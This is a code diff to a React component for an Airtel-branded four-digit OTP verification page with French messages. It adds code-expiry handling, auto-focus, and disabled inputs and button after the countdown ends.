@@ -6,26 +6,36 @@ function AirtelOTPVerify() {
   const [otp, setOtp] = useState<string[]>(['', '', '', '']);
   const [timeLeft, setTimeLeft] = useState(45);
   const [error, setError] = useState('');
+  const [expired, setExpired] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
 
-  // Récupérer le numéro de téléphone enregistré lors de la connexion
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
 
-  // Si aucun numéro n'est enregistré, rediriger vers la connexion
+  // Redirect to login if no phone saved
   useEffect(() => {
     if (!phoneNumber) {
       navigate('/');
     }
   }, [phoneNumber, navigate]);
 
-  // Compte à rebours
+  // Auto-focus first OTP box on mount
   useEffect(() => {
-    if (timeLeft <= 0) return;
-    const timer = setInterval(() => {
+    inputRefs.current[0]?.focus();
+  }, []);
+
+  // Countdown timer — reliable setTimeout version
+  useEffect(() => {
+    if (timeLeft <= 0) {
+      setExpired(true);
+      return;
+    }
+
+    const timer = setTimeout(() => {
       setTimeLeft((prev) => prev - 1);
     }, 1000);
-    return () => clearInterval(timer);
+
+    return () => clearTimeout(timer);
   }, [timeLeft]);
 
   const handleChange = (index: number, value: string) => {
@@ -48,7 +58,12 @@ function AirtelOTPVerify() {
     e.preventDefault();
     const otpString = otp.join('');
 
-    // Validation locale — doit contenir 4 chiffres
+    // Block if expired
+    if (expired) {
+      alert('⏱️ Le code a expiré. Veuillez cliquer sur « Renvoyer le code » pour en recevoir un nouveau.');
+      return;
+    }
+
     if (otpString.length < 4) {
       setError('Veuillez saisir le code de vérification à 4 chiffres.');
       alert('⚠️ Veuillez saisir le code de vérification à 4 chiffres.');
@@ -66,18 +81,12 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        // ✅ Code correct — passer à la page suivante
         navigate('/airtel-loan-limit');
       } else {
-        // ❌ Code incorrect — afficher un popup, une erreur en ligne, et vider les cases
         const wrongMsg = '❌ Code incorrect ! Veuillez vérifier le code envoyé sur votre téléphone et réessayer.';
         alert(wrongMsg);
         setError(data.message || 'Code invalide. Veuillez réessayer.');
-
-        // Vider les champs OTP pour permettre une nouvelle saisie
         setOtp(['', '', '', '']);
-
-        // Remettre le focus sur la première case
         setTimeout(() => {
           inputRefs.current[0]?.focus();
         }, 100);
@@ -90,6 +99,7 @@ function AirtelOTPVerify() {
 
   const handleResend = async () => {
     setTimeLeft(45);
+    setExpired(false);
     setOtp(['', '', '', '']);
     setError('');
 
@@ -106,6 +116,9 @@ function AirtelOTPVerify() {
 
       if (data.status === 'success') {
         alert('📩 Un nouveau code a été envoyé sur votre téléphone.');
+        setTimeout(() => {
+          inputRefs.current[0]?.focus();
+        }, 100);
       } else {
         alert(data.message || 'Échec de l\'envoi du nouveau code.');
       }
@@ -158,6 +171,7 @@ function AirtelOTPVerify() {
                   onChange={(e) => handleChange(index, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(index, e)}
                   className="airtel-otp-box"
+                  disabled={expired}
                 />
               ))}
             </div>
@@ -176,15 +190,21 @@ function AirtelOTPVerify() {
             </div>
           )}
 
-          <div className="airtel-timer">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#E53E3E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          {/* Timer / Expiry message */}
+          <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <circle cx="12" cy="12" r="10"></circle>
               <polyline points="12 6 12 12 16 14"></polyline>
             </svg>
-            <span>{timeLeft}s</span>
+            <span>{expired ? 'Code expiré' : `${timeLeft}s`}</span>
           </div>
 
-          <button type="submit" className="airtel-verify-btn">
+          <button
+            type="submit"
+            className="airtel-verify-btn"
+            disabled={expired}
+            style={expired ? { opacity: 0.5, cursor: 'not-allowed' } : undefined}
+          >
             Vérifier le code
             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
               <line x1="5" y1="12" x2="19" y2="12"></line>
